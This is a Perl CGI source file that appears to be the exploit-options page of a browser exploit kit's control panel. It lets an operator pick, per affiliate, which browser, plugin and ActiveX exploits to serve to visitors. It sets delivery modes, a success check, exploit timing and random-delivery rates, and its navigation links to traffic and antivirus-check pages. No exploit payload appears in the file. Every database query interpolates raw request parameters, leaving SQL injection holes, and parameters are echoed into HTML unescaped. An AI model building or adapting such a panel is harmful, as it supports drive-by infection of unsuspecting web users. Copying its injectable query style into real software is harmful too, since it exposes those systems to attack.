#!/usr/bin/perl
  
  # xplindex.pl
  use CGI;
  use CGI::Carp qw/fatalsToBrowser warningsToBrowser/;
  use CGI::Session ( '-ip_match' );
  use DBI;
  require "xpl/config.pl";

  $session = CGI::Session->load();
  $q = new CGI;

  $cook = $q->param('cook');
  $vfy = $q->param('vfy');
  $xpmode = $q->param('mode');
  $changem = $q->param('changem');
  $optionsreal = $q->param('optionsreal');
  $optionsreal23 = $q->param('optionsreal23');
  $optionsreal26 = $q->param('optionsreal26');
  $time_bxpl = $q->param('time_bxpl');
  $percent_rand = $q->param('percent_rand');
  $selectuser = $q->param('selectuser');
  $group1 = $q->param('group1');
  $group2 = $q->param('group2');
  $showxplview = $q->param('showxplview');

  if($selectuser eq '')
  {
    $selectuser = 'Admin';
  }

  if(CGI::param("check_crash"))
  {
    $check_crash = 'yes';
  }
  else
  {
    $check_crash = 'no';
  }


  #get all exploits
  my @exploits_to_load = $q->param('exploits_to_load');
  $multiple_exploits_to_load = '';
  foreach my $single_exploits_to_load (@exploits_to_load)
  {
    $multiple_exploits_to_load .= $single_exploits_to_load . ',';
  }
  
  
  $db_name = 'DBI:mysql:' . $config{MysqlDB};
  $dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

  $req = "SELECT cook FROM affiliates WHERE username='$selectuser'";
  $sth = $dbh->prepare($req);
  $sth->execute() || die;
  while(my @row = $sth->fetchrow_array)
  {
    $cook = $row['0'];
  }
  $sth -> finish;
  
  if($vfy ne 'xplad')
  {
    print "Status: 301 Moved\nLocation: login.pl\n\n";
  }  
  if($session->is_expired)
  {
    print $q->header(-cache_control=>"no-cache, no-store, must-revalidate");
    print "Your has session expired. Please login again.";
	print "<br/><a href='login.pl>Login</a>";
  }
  elsif($session->is_empty)
  {
    #print $q->header(-cache_control=>"no-cache, no-store, must-revalidate");
    print "Status: 301 Moved\nLocation: login.pl\n\n";
  }
  else
  {
    if($optionsreal eq "yes")
    {
      $sql = "UPDATE options SET mode='$xpmode', submode='$group1' WHERE username='$selectuser'";
      $statement = $dbh->prepare($sql);
      $statement->execute() or die "$DBI::errstr";
    }




    if($changem eq "exploitss")
    {

      $sql = "UPDATE options SET exploits_enabled='$multiple_exploits_to_load' WHERE username='$selectuser'";
      $statement = $dbh->prepare($sql);
      $statement->execute() or die "$DBI::errstr";

      if($optionsreal eq "yes")
      {
        $sql = "UPDATE options SET check_crash='$check_crash', time_bxpl='$time_bxpl', percent_rand='$percent_rand', showxpl='$showxplview', mode='$xpmode', submode='$group1', priority='$group2' WHERE username='$selectuser'";
        $statement = $dbh->prepare($sql);
        $statement->execute() or die "$DBI::errstr";
      }
    }

    #grab new values from db
    $req = "SELECT submode,priority,mode,exploits_enabled,check_crash,time_bxpl,percent_rand,showxpl FROM options WHERE username='$selectuser'";
    $sth = $dbh->prepare($req);
    $sth->execute() || die;
    while(my @row = $sth->fetchrow_array)
    {
      $submodechkoptmode = $row['0'];
      $submodechkoptprio = $row['1'];
      if($xpmode eq '') { $xpmode = $row['2']; }
      $exploits_enabled = $row['3'];
      $jcheckopt = $row['4'];
      $timebexploit = $row['5'];
      $percentrand = $row['6'];
      $showxplview = $row['7'];
    }
    $sth -> finish;

    #define submode to show
    $subpersonal = 'checked' if($submodechkoptmode =~ "personal");
    $subshared = 'checked' if($submodechkoptmode =~ "shared");

    #define exploit priority to show
    $subnone = 'checked' if($submodechkoptprio =~ "noprio");
    $subactivex = 'checked' if($submodechkoptprio =~ "ActiveX");
    $subplugin = 'checked' if($submodechkoptprio =~ "Plugin");
    $subother = 'checked' if($submodechkoptprio =~ "Other");

    #define mode to show
    $selectaggr = 'selected="yes"' if($xpmode eq 'aggr');
    $selectrand = 'selected="yes"' if($xpmode eq 'rand');
    $selectai = 'selected="yes"' if($xpmode eq 'ai');
    $selecthybrid = 'selected="yes"' if($xpmode eq 'hybrid');

    $chkchkxpl = 'checked="yes"' if($jcheckopt =~ "yes");
    $showxplview1 = 'selected="yes"' if($showxplview eq "2");
    $showxplview2 = 'selected="yes"' if($showxplview eq "3");

    #show users to add
    $userchoice = '<form method="post">' . "\n";
    $userchoice .= '<SELECT name="selectuser" ONCHANGE="location = this.options[this.selectedIndex].value;">' . "\n";

    #Select the Users from DB
    $req = "SELECT username FROM affiliates";
    $sth = $dbh->prepare($req);
    $sth->execute() || die;
    while(my @row = $sth->fetchrow_array)
    {
      $userchoiceuser = $row['0'];
      if($selectuser eq $userchoiceuser)
      {
	$userchoice .= '<option selected="yes" value="xploptions.pl?vfy=xplad&cook=' . $cook . '&selectuser=' . $userchoiceuser . '">' . $userchoiceuser . '</option>' . "\n";
      }
      else
      {
	$userchoice .= '<option value="xploptions.pl?vfy=xplad&cook=' . $cook . '&selectuser=' . $userchoiceuser . '">' . $userchoiceuser . '</option>' . "\n";
      }

    }
    $sth -> finish;

    $userchoice .= '</SELECT>' . "\n";
    $userchoice .= "<input type=\"hidden\" name=\"cook\" value=\"$cook\">\n";
    $userchoice .= "<input type=\"hidden\" name=\"vfy\" value=\"xplad\">\n";
    $userchoice .= "</form>\n";



    $choiceoption .= '<option ' . $selectaggr . 'value="xploptions.pl?vfy=xplad&cook=' . $cook . '&mode=aggr&selectuser=' . $selectuser . '">Aggressive</option>' . "\n";
    $choiceoption .= '<option ' . $selectrand . 'value="xploptions.pl?vfy=xplad&cook=' . $cook . '&mode=rand&selectuser=' . $selectuser . '">Random</option>' . "\n";
    $choiceoption .= '<option ' . $selectai . 'value="xploptions.pl?vfy=xplad&cook=' . $cook . '&mode=ai&selectuser=' . $selectuser . '">Artificial Intelligence</option>' . "\n";
    $choiceoption .= '<option ' . $selecthybrid . 'value="xploptions.pl?vfy=xplad&cook=' . $cook . '&mode=hybrid&selectuser=' . $selectuser . '">Hybrid</option>' . "\n";


    if($xpmode eq 'ai' or $xpmode eq 'hybrid')
    {
      $submodetoshow = <<SUBSHOWLOAD;
<form method="post">
<h4><b>Submode</b></h4>
<input type="radio" name="group1" value="personal" $subpersonal> Personal<br>
<input type="radio" name="group1" value="shared" $subshared> Shared<br>
<input type="hidden" name="changem" value="exploitss">
<input type="hidden" name="cook" value="$cook">
<input type="hidden" name="stats" value="$stats">
<input type="hidden" name="selectuser" value="$selectuser">
<input type="hidden" name="vfy" value="xplad">
<input type="hidden" name="optionsreal23" value="yes">
<input type="submit" name="submit" value="submit">
</form>
SUBSHOWLOAD

$priotoshow = <<PRIOSHOWLOAD;
<td>
<h4><b>Exploit Priority</b></h4>
<table>
<tr>
<td>
<input type="radio" name="group2" value="noprio" $subnone> None<br>
<input type="radio" name="group2" value="ActiveX" $subactivex> ActiveX<br>
</td>
<td>
<input type="radio" name="group2" value="Plugin" $subplugin> Plugin<br>
<input type="radio" name="group2" value="Other" $subother> Other<br>
<td>
</tr>
</table>
</td>
</tr>
</table>
<input type="hidden" name="cook" value="$cook">
<input type="hidden" name="stats" value="$stats">
<input type="hidden" name="selectuser" value="$selectuser">
<input type="hidden" name="vfy" value="xplad">
<input type="hidden" name="optionsreal26" value="yes">
PRIOSHOWLOAD

    }
    
    print $q->header(-cache_control=>"no-cache, no-store, must-revalidate");
    $exploitstoload = toload();
    $optionstoloadd = boptions() if($xpmode eq 'rand');
    $optionstoloadd = aioptions() if($xpmode eq 'ai');
    $optionstoloadd = hybridoptions() if($xpmode eq 'hybrid');
    indexalltab();
  }

sub toload
{
  $group_other = '';
  $group_activex = '';
  $group_plugin = '';

  $count_other = 0;
  $count_activex = 0;
  $count_plugin = 0;

  #check what exploits are curently enabled
  @exploits_enabled_all = split(/,/, $exploits_enabled);

  #grab all exploits from DB
  $req = "SELECT id,name,groups,description FROM exploits";
  $sth = $dbh->prepare($req);
  $sth->execute() || die;
  while(my @row = $sth->fetchrow_array)
  {
    $xplid = $row['0'];
    $xplname = $row['1'];
    $xplgroup = $row['2'];
    $xpldescription = $row['3'];

    $currentxpl_enabled = '';
    $currentxpl = '';
    foreach my $currentxpl (@exploits_enabled_all)
    {
      if($xplid eq $currentxpl)
      {
        $currentxpl_enabled = 'checked="yes"';
      }
    }

    if($xplgroup eq 'Other')
    {
      $group_other .= '<td><input type="checkbox" ' . $currentxpl_enabled . ' value="' . $xplid . '" name="exploits_to_load"><div class="nobr">' . $xpldescription . '</div></td>' . "\n";

      $count_other++;
      if($count_other eq 4)
      {
        $group_other .= '</tr><tr>' . "\n";
        $count_other = 0;
      }

    }

    if($xplgroup eq 'ActiveX')
    {
      $group_activex .= '<td><input type="checkbox" ' . $currentxpl_enabled . ' value="' . $xplid . '" name="exploits_to_load"><div class="nobr">' . $xpldescription . '</div></td>' . "\n";
      $count_activex++;
      if($count_activex eq 4)
      {
        $group_activex .= '</tr><tr>' . "\n";
        $count_activex = 0;
      }
    }

    if($xplgroup eq 'Plugin')
    {
      $group_plugin .= '<td><input type="checkbox" ' . $currentxpl_enabled . ' value="' . $xplid . '" name="exploits_to_load"><div class="nobr">' . $xpldescription . '</div></td>' . "\n";
      $count_plugin++;
      if($count_plugin eq 4)
      {
        $group_plugin .= '</tr><tr>' . "\n";
        $count_plugin = 0;
      }
    }

  }
  $sth -> finish;

  $exploitstoload = <<EXPLLOAD;

<b><font size="3">Browser Exploits</font></b>
<center>
<table COLS=4 WIDTH="800">
<tr VALIGN=TOP>
$group_other
</tr>
</table>
</center>
<br>

<b><font size="3">Plugins Exploits</font></b>
<center>
<table COLS=4 WIDTH="800">
<tr VALIGN=TOP>
$group_plugin
</tr>
</table>
</center>
<br>

<b><font size="3">ActiveX Exploits</font></b>
<center>
<table COLS=4 WIDTH="800">
<tr VALIGN=TOP>
$group_activex
</tr>
</table>
</center>
<br>

EXPLLOAD

return $exploitstoload;
}

sub boptions
{
  $optionstoload =  <<OPTIONSRU;
<input type="hidden" name="optionsreal" value="yes">
<br><h3>Options:</h3><br>
<h4><u><b>General Options</u></b></h4>
Check if Exploited before continue: <input type="checkbox" $chkchkxpl value="option2" name="check_crash"><br>
Time (second) before next exploit: <input type="text" name="time_bxpl" length="1" value="$timebexploit"><br><br>
OPTIONSRU
return $optionstoload;
}

sub aioptions
{
  $optionstoload =  <<OPTIONSRU2;
<input type="hidden" name="optionsreal" value="yes">
<br><h3>Options:</h3><br>
<table>
<tr>
<td>
<h4><u><b>General Options</u></b></h4>
Check if Exploited before continue: <input type="checkbox" $chkchkxpl value="option2" name="check_crash"><br>
Time (second) before next exploit: <input type="text" name="time_bxpl" length="1" value="$timebexploit"><br>
Percentage of random exploit delivery: <input type="text" name="percent_rand" length="1" value="$percentrand">%<br><br>
</td>

OPTIONSRU2
return $optionstoload;
}

sub hybridoptions
{
  $optionstoload =  <<OPTIONSRU2;
<input type="hidden" name="optionsreal" value="yes">
<br><h3>Options:</h3><br>
<table>
<tr>
<td>
<h4><u><b>General Options</u></b></h4>
Check if Exploited before continue: <input type="checkbox" $chkchkxpl value="option2" name="check_crash"><br>
Time (second) before next exploit: <input type="text" name="time_bxpl" length="1" value="$timebexploit"><br>
Percentage of random exploit delivery: <input type="text" name="percent_rand" length="1" value="$percentrand">%<br>
Number of exploits: 
<select name="showxplview">
  <option $showxplview1 value="2">2</option>
  <option $showxplview2 value="3">3</option>
</select>
<br><br>
</td>

OPTIONSRU2
return $optionstoload;
}

sub indexalltab
{
 print <<THEHTMLINDEX;
 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<HTML xmlns="http://www.w3.org/1999/xhtml" lang="fr"><HEAD><META http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">

<TITLE>$config{NetName} - Options</TITLE>
    <LINK rel="stylesheet" type="text/css" href="style/style3.css" media="all">

<script type="text/javascript">
			function showBox(text, obj, e) {
					obj.onmouseout = hideBox;
					node = document.createElement('div');
					node.style.left = e.layerX + 'px';
					node.style.top = e.layerY + 'px';
					node.id = 'popBox';
					node.innerHTML = text;
					obj.appendChild(node);
			}
function moveBox(e) {
	node = document.getElementById('popBox');
	node.style.left = e.layerX + 'px';
	node.style.top = e.layerY + 'px';
}
function hideBox() {
	node = document.getElementById('popBox');
	node.parentNode.removeChild(node);
}
</script>
<style type="text/css">
        div.nobr {
                 display: inline;
        }
	#popBox {
		position: absolute;
		z-index: 2;
		background: #cccccc;
		width: 200px;
		padding: 0.3em;
		border: 1px solid gray;
	}
	span {
		color: red;
		font-weight: bold;
	}
</style>
    
</HEAD><BODY>

<DIV id="top_nav">
	<DIV class="content">
    
        <UL>
            <LI><A href="xplindex.pl?cook=$cook&vfy=xplad" title="Home" class="Home">Home</A></LI>
            <LI><A href="xplstats.pl?cook=$cook&vfy=xplad" title="Reports">Reports</A></LI>
            <LI><A href="xplprograms.pl?cook=$cook&selectuser=Admin&vfy=xplad" title="Accounts">Accounts</A></LI>
	    <LI><A href="xploptions.pl?cook=$cook&selectuser=$selectuser&vfy=xplad" title="Exploits Options">Exploits</A></LI>
	    <LI><A href="xpltraffic.pl?cook=$cook&selectuser=$selectuser&vfy=xplad" title="Traffic Options">Traffic</A></LI>
            <LI><A href="xplavs.pl?cook=$cook&selectuser=$selectuser&vfy=xplad" title="AVs Check">AV Check</A></LI>
            <LI><A href="login.pl?action=logout" title="Log Out">Log Out</A></LI>
        </UL>
        
    </DIV>
</DIV>
<center>

<br>
<b>
<h2>[ Exploit Options ]</h2>
<br>
<center>
$userchoice
</center><br>
<DIV id="main">
<DIV class="content">
<DIV id="pages">
<DIV id="home">
<DIV>
</DIV>
<br><br>
<h3>Modes:</h3><br>
<form method="post">
<SELECT name="selectuser" ONCHANGE="location = this.options[this.selectedIndex].value;">
$choiceoption
</SELECT>
<input type="hidden" name="cook" value="$cook">
<input type="hidden" name="stats" value="$stats">
<input type="hidden" name="selectuser" value="$selectuser">
<input type="hidden" name="vfy" value="xplad">
</form>
$submodetoshow
<br><br>
<h3>Select Exploits:</h3><br>
<form method="post">
$exploitstoload
<input type="hidden" name="cook" value="$cook">
<input type="hidden" name="stats" value="$stats">
<input type="hidden" name="vfy" value="xplad">
<input type="hidden" name="mode" value="$xpmode">
<input type="hidden" name="selectuser" value="$selectuser">
<input type="hidden" name="changem" value="exploitss">
$optionstoloadd
$priotoshow
<input type="submit" name="submit" value="submit">
</form>
<br><br>
</DIV>
</DIV>
</DIV>
</DIV>


<br>
if you have questions or program request, contact us at <a href="mailto:$config{NetEmail}"> $config{NetEmail}</a>
<br><br>
</center>

<DIV id="footer">
	<DIV class="content">
        <DIV class="copyright">
        	<P><BR>
        </DIV>        
    </DIV>
</DIV>

</body>
</html>
 
 
THEHTMLINDEX
}
